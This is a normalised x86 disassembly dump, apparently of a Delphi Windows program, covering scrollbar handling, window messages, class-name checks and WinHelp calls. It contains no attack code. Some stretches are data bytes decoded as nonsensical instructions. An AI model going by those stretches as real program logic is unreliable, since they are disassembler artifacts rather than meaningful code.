mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_448b9b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5b99173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_456054
push eax
call SendMessageA
pop ebx
retn
sub_448bd0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_448c45
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44f854
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4666f8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4554d8
mov eax ebx
mov si 0xffb8
call sub_4034ac
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448c4c
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_448c54
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_4034ac
jmp r-xdata
pop esi
retn
sub_448c84
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451d80
mov edx 0x79
mov eax esi
call sub_44f010
push 0x3
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_44f034
mov dl 0x1
mov eax esi
call sub_456288
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x208 ] 0x0
xor eax eax
mov [ esi + 0x20c ] eax
xor eax eax
mov [ esi + 0x210 ] eax
mov [ esi + 0x214 ] 0x64
mov [ esi + 0x220 ] 0x1
mov [ esi + 0x222 ] 0x1
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_448d3c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_452ee0
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_452e0c
xor eax eax
mov al [ ebx + 0x208 ]
mov eax [ eax * 4 + rw-data ]
or [ edi + 0x4 ] eax
cmp [ ebx + 0x208 ] 0x1
jne r-xdata
mov eax ebx
call sub_448e7c
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_4034ac
test al al
jne r-xdata
mov [ ebx + 0x21c ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
jmp r-xdata
or [ edi + 0x4 ] 0x2
or [ edi + 0x4 ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_448dcc
call sub_44f1f4
mov eax ebx
call sub_45300c
lea edx [ esp + 0x1c ]
mov eax ebx
call sub_44f214
push 0x0
mov eax [ ebx + 0x214 ]
push eax
mov eax [ ebx + 0x210 ]
push eax
push 0x2
mov eax ebx
call sub_456054
push eax
call SetScrollRange
mov [ esp ] 0x1c
mov eax [ ebx + 0x218 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x4 ] 0x2
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_456054
push eax
call SetScrollInfo
mov eax ebx
call sub_448e7c
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_456054
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_456054
push eax
call SetScrollPos
jmp r-xdata
add esp 0x2c
pop ebx
retn
sub_448e7c
push ebx
mov ebx eax
mov eax ebx
call sub_44fe98
test al al
je r-xdata
mov al 0x1
pop ebx
retn
cmp [ ebx + 0x208 ] 0x1
je r-xdata
xor eax eax
pop ebx
retn
sub_448e9c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] dl
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax ebx
call sub_4535f4
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
sub_448ed8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44900f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebp - 0x4 ]
jl r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
cmp esi [ ebx + 0x218 ]
jge r-xdata
cmp esi edi
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp - 0x4 ]
jge r-xdata
mov eax [ ebx + 0x210 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edi esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x210 ] eax
mov [ ebx + 0x214 ] esi
mov eax ebx
call sub_456358
test al al
je r-xdata
cmp esi [ ebx + 0x214 ]
je r-xdata
cmp edi [ ebx + 0x20c ]
je r-xdata
cmp edi [ ebx + 0x20c ]
sete al
neg al
sbb eax eax
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_456054
push eax
call SetScrollRange
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449016
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
mov [ ebx + 0x20c ] edi
mov eax ebx
call sub_456358
test al al
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
mov si 0xffb3
call sub_4034ac
mov eax ebx
call sub_448e7c
test al al
je r-xdata
push 0xffffffff
mov eax [ ebx + 0x214 ]
sub eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_456054
push eax
call SetScrollPos
push 0xffffffff
mov eax [ ebx + 0x20c ]
push eax
push 0x2
mov eax ebx
call sub_456054
push eax
call SetScrollPos
jmp r-xdata
sub_449034
push ebx
add esp 0xffffffe4
mov ebx eax
cmp edx [ ebx + 0x218 ]
je r-xdata
add esp 0x1c
pop ebx
retn
cmp edx [ ebx + 0x214 ]
jg r-xdata
mov [ ebx + 0x218 ] edx
mov [ esp ] 0x1c
mov [ esp + 0x10 ] edx
mov [ esp + 0x4 ] 0x2
mov eax ebx
call sub_456358
test al al
je r-xdata
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_456054
push eax
call SetScrollInfo
sub_4490fc
push ebx
push esi
push edi
add esp 0xffffffe0
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20c ]
xor eax eax
mov al [ edi + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebx + 0x210 ]
cmp esi eax
jge r-xdata
jmp [ eax * 4 + jump_table_449121 ]
mov eax [ ebx + 0x214 ]
cmp esi eax
jle r-xdata
mov esi eax
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x220 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
sub esi eax
jmp r-xdata
movzx eax [ ebx + 0x222 ]
imul [ ebx + 0x21c ]
add esi eax
jmp r-xdata
mov [ esp + 0x4 ] 0x1c
mov [ esp + 0x8 ] 0x17
lea eax [ esp + 0x4 ]
push eax
push 0x2
mov eax ebx
call sub_456054
push eax
call GetScrollInfo
mov esi [ esp + 0x1c ]
mov eax ebx
call sub_448e7c
test al al
jne r-xdata
mov esi [ ebx + 0x210 ]
jmp r-xdata
mov esi [ ebx + 0x214 ]
mov [ esp ] esi
mov ecx esp
mov dl [ edi + 0x4 ]
mov eax ebx
mov si 0xffb2
call sub_4034ac
mov edx [ esp ]
mov eax ebx
call sub_449020
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov esi eax
mov eax [ ebx + 0x214 ]
sub eax esi
mov esi eax
jmp r-xdata
sub_449224
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_456054
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
pop esi
pop ebx
retn
sub_449254
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_449279
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449280
retn
sub_449290
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x93
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 ] ch
inc esp
add [ eax - 0x34000000 ] ah
mov dh 0x45
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add ah dh
mov edi 0xc0440045
inc ebp
add al ch
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ ebx - 0x46ebffbe ] bl
inc ebp
add [ eax ] dl
lds eax [ ebp ]
clc
sbb al [ edx ]
loopne r-xdata
sbb eax 0x1d440042
inc edx
add [ eax ] bl
sbb eax 0xba680042
inc ebp
add [ eax ] bh
retn
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
adc [ ebx + 0x1ddc0044 ] 0x42
add [ eax + 0x1400421d ] al
sub_449380
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45bfa0
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_4493bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4493e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4493e8
retn
sub_44948c
insd
xchg esp eax
inc esp
add [ edi - 0x6c ] dh
ja r-xdata
cmp cl [ esp + edx * 4 + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
shl al 0xe9
imul eax [ edx ] 0x0
add [ ebx + 0x77e9e0c0 ] al
add al [ eax ]
add [ ebx - 0x18161f40 ] al
inc esp
add [ ecx + 0x25004494 ] al
xchg esp eax
inc esp
add [ 0x35004494 ] ch
xchg esp eax
inc esp
add [ 0x45004494 ] bh
xchg esp eax
inc esp
add [ ebp - 0x6c ] cl
inc esp
add [ ebp - 0x6c ] dl
inc esp
add [ ebp - 0x6c ] bl
inc esp
add [ ebp - 0x6c ] ah
inc esp
add [ 0xd004494 ] al
xchg esp eax
inc esp
add [ 0x1d004494 ] dl
xchg esp eax
inc esp
add ch bh
dec ebp
xchg esp eax
cmp cl [ esp + edx * 4 + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add eax [ eax ]
add [ ebx - 0x161f40 ] al
cmp eax [ 0xffffffffc0830000 ]
xchg ebx eax
inc esp
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
sbb eax 0xfd004494
cmp cl [ esp + edx * 4 + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add eax [ eax ]
add [ ebx + 0x3fe9e0c0 ] al
add eax 0xc0830000
loopne r-xdata
dec edi
add eax 0x44830000
and al 0x4
loopne r-xdata
add [ 0x15004494 ] cl
xchg esp eax
inc esp
add [ 0xfffffffffd004494 ] bl
inc esp
add al dl
xchg esp eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 4 + 0x44 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x24004495 ] cl
add [ eax ] al
add [ ecx + edx + 0x34e00040 ] ah
inc eax
add ah al
pop ecx
inc eax
add al dl
pop ecx
inc eax
add ah dh
xor al 0x40
add al ch
xor al 0x40
add al ah
pop ecx
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] dl
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
test al 0xb3
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_449655
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4040ac
test edi edi
jne r-xdata
loopne r-xdata
add [ ebx + 0x3be9e0c0 ] al
add eax 0xc0830000
jns r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404144
cmp [ ebx + 0x1c ] 0x0
je r-xdata
add al [ eax ]
add [ ebx - 0x7c161f40 ] al
add eax [ eax ]
add [ ebx + 0x7fe9e0c0 ] al
sti
inc [ ebx - 0x1ffbdbbc ]
jmp sub_405a18
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44965c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40442c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4495a0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_449655
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4040ac
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404144
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44965c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40442c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_449670
push ebx
mov ebx eax
mov eax ebx
call sub_4499a0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405944
sub_4496ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449713
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4495a0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44971a
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_449724
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4497ac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_449698
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40442c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4497b3
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
sub_4497bf
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_449847
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_449ee4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44984e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4495a0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_449854
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44994c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_4495a0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408fe4
mov eax ebx
call sub_449ee4
test al al
je r-xdata
mov ecx sub_4493f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449953
lea eax [ ebp - 0x1c ]
call sub_4040ac
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_4495a0
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_449e3c
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_404100
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_40456c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4499bc
push ebx
mov ebx eax
mov eax ebx
call sub_4499a0
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405944
pop ebx
retn
mov eax rw-data
call sub_405944
sub_4499ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_449a44
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449a4b
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_4495a0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_449a54
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449b4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408fa4
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4495a0
mov eax ebx
call sub_449ee4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449b51
lea eax [ ebp - 0x110 ]
call sub_4040ac
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40431c
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_449e3c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40431c
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_449b68
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_449bca
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449bd1
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4495a0
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_449bdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449c5c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4495a0
mov eax ebx
call sub_449ee4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449c63
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_449e3c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_40456c
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_449c6c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_449d57
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_449ee4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449d5e
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_4040d0
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_408288
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_449e3c
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_408288
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_404100
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4495a0
mov eax [ ebp - 0x14 ]
call sub_40456c
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_449d6c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408a08
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_449dc7
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_4089e4
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_449e3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40455c
xor eax eax
push ebp
push sub_449eb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_449e20
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449eb9
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407f7c
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_449ec8
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
